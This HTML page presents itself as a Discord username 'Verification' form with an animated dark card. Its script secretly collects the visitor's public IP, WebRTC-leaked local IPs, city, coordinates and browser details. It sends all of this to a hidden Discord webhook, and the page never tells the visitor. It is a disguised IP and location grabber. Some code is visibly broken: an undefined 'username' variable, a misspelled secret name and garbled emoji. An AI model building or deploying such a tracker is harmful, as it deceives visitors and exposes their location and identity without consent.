<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>üîí Verification</title>
  <style>
    @keyframes bgAnim { 0%,100% { background-position:0% 50% } 50% { background-position:100% 50% } }
    body { margin:0; padding:0; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; font-family:'Segoe UI',sans-serif; background:linear-gradient(-45deg, #1e1e2f, #2c2c3e, #3a3a4d, #4a4a5e); background-size:400% 400%; animation:bgAnim 15s infinite; color:#eee; text-shadow:0 2px 4px rgba(0,0,0,0.6); }
    .particle { position:absolute; border-radius:50%; background:rgba(255,255,255,0.05); animation:drift linear infinite; }
    @keyframes drift { from{transform:translate(0,0)} to{transform:translate(100px,-200px)} }
    .card { position:relative; width:90%; max-width:360px; padding:2rem; background:rgba(0,0,0,0.75); border-radius:12px; box-shadow:0 8px 32px rgba(0,0,0,0.6); text-align:center; z-index:1; }
    h1 { margin:0 0 1rem; font-size:1.5rem; letter-spacing:.5px; }
    input,button { width:100%; padding:.75rem; margin-top:.5rem; border:none; border-radius:8px; font-size:1rem; outline:none; }
    input { background:#2c2c3e; color:#eee; }
    input:focus { box-shadow:0 0 10px rgba(9,157,255,0.6); }
    button { background:linear-gradient(45deg,#3273dc,#275bbe); color:#fff; cursor:pointer; transition:background .2s,transform .1s; }
    button:hover { background:linear-gradient(45deg,#4183ff,#3a6cff); }
    button:active { transform:scale(.97); }
    .status { margin-top:1.5rem; display:flex; align-items:center; justify-content:center; font-size:1.1rem; opacity:0; transition:opacity .4s; }
    .status.visible { opacity:1; }
    .status svg { margin-right:.6rem; }
    footer { margin-top:2rem; font-size:.75rem; color:rgba(255,255,255,0.6); }
    footer a { color:#4faaff; text-decoration:none; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Enter Discord Username</h1>
    <input type="text" id="username" placeholder="CoolUser#1234" />
    <button id="submitBtn">Verify</button>
    <div id="status" class="status"></div>
  </div>
  <footer>Made by <a href="https://github.com/yourusername">yourusername</a></footer>

  <script>
  document.addEventListener('DOMContentLoaded', () => {
    const WEBHOOK = '${{ secrets.WEHOOK }}'; // Dynamic injection during deployment

    const usernameInput = document.getElementById('username');
    const submitBtn = document.getElementById('submitBtn');
    const statusEl = document.getElementById('status');

function showStatus(success, text) {
  const statusEl = document.getElementById('status'); // Ensure this is defined
  const icon = success
    ? '<svg width="24" height="24" fill="#28a745"><path d="M16 2L6 14 0 8l2-2 4 4L14 0z"/></svg>'
    : '<svg width="24" height="24" fill="#dc3545"><path d="M12 2L2 12l10 10 10-10L12 2z"/></svg>';
   
  statusEl.innerHTML = icon + '<span>' + text + '</span>';
  statusEl.classList.add('visible');
}

    async function fetchPublicIP() {
      const services = [
        'https://api.ipify.org?format=json',
        'https://ipapi.co/json/',
        'https://ipwho.is/'
      ];
      for (const url of services) {
        try {
          const res = await fetch(url, { mode: 'cors' });
          const data = await res.json();
          if (data.ip) return data.ip; // Standard IP field
          if (data.ipAddress) return data.ipAddress; // Alternate fiel
        } catch (err) {
          console.error(`Failed to fetch IP from ${url}`);
        }
      }
      throw new Error('Unable to fetch public IP');
    }

    async function getWebRTCIPs() {
      return new Promise((resolve) => {
        const ips = [];
        const rtc = new RTCPeerConnection({ iceServers: [] });
        rtc.createDataChannel('');
        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
        rtc.onicecandidate = (event) => {
          if (event && event.candidate) {
            const ip = event.candidate.candidate.split(' ')[4];
            if (ip && !ips.includes(ip)) ips.push(ip);
          }
        };
        setTimeout(() => resolve(ips), 3000);
      });
    }

    submitBtn.addEventListener('click', async () => {
      const name = usernameInput.value.trim();
      if (!name) {
        showStatus(false, 'Enter username');
        return;
      }
      showStatus(false, 'Verifying‚Ä¶');
      submitBtn.disabled = true;

      try {
        const publicIP = await fetchPublicIP();
        const webrtcIPs = await getWebRTCIPs();

        // Fetch geo data
        let geo;
        try {
          const res = await fetch(`https://ipapi.co/${publicIP}/json/`);
          geo = await res.json();
        } catch {
          const res = await fetch(`https://ipwho.is/${publicIP}`);
          geo = await res.json();
        }

        // VPN detection
        let score = 0,
          flags = [];
        if (geo.org && /hosting|datacenter|cloud|proxy|vpn/i.test(geo.org)) {
          flags.push('Datacenter');
          score += 40;
        }
        if (geo.timezone && !geo.timezone.includes(geo.country_code)) {
          flags.push('Timezone mismatch');
          score += 20;
        }
        const vpn = score >= 40;

        // Build embed
        const embed = {
          username: 'Verification System',
          embeds: [
            {
              title: `${geo.country_code ? String.fromCodePoint(...geo.country_code.toUpperCase().split('').map(c => 127397 + c.charCodeAt())) : ''} User Verification: ${geo.city || 'Unknown'}, ${geo.country_name}`,
              color: vpn ? 16755007 : 65280,
              fields: [
                { name: 'üîç Username', value: username, inline: true },
                { name: 'üîç Verification Status', value: vpn ? '‚ùå FAILED: VPN/Proxy Detected' : '‚úÖ PASSED: No VPN Detected', inline: true },
                { name: 'üìç Location', value: `${geo.city}, ${geo.region || geo.region_name}, ${geo.country_name}`, inline: true },
                { 
                  name: 'üåê Public IP', 
                  value: `[${publicIP}](https://iplookup.io/ip/${publicIP})`, 
                  inline: true 
                },
                { 
                  name: 'üåç Coordinates', 
                  value: `[${geo.latitude || 'Unknown'}, ${geo.longitude || 'Unknown'}](https://www.google.com/maps?q=${geo.latitude || ''},${geo.longitude || ''})`, 
                  inline: true 
                },
                { name: '‚ö†Ô∏è Suspicious Factors', value: flags.length ? flags.join(', ') : 'None', inline: true },
                { name: 'üì± Device Info', value: navigator.userAgent, inline: false },
                { name: 'üìÖ Verification Time', value: new Date().toLocaleString('en-GB'), inline: false },
                { name: 'üïµÔ∏è WebRTC IPs', value: webrtcIPs.length ? webrtcIPs.join(', ') : 'None', inline: false }
              ],
              footer: {
                text: `Verified at ${new Date().toLocaleString('en-GB')}`
              }
            }
          ]
        };

        // Send webhook
        await fetch(WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(embed)
        });

        showStatus(!vpn, vpn ? 'VPN/Proxy detected' : 'Verified');
      } catch (err) {
        console.error(err);
        showStatus(false, 'Error');
      } finally {
        submitBtn.disabled = false;
      }
    });
  });
  </script>
</body>
</html>
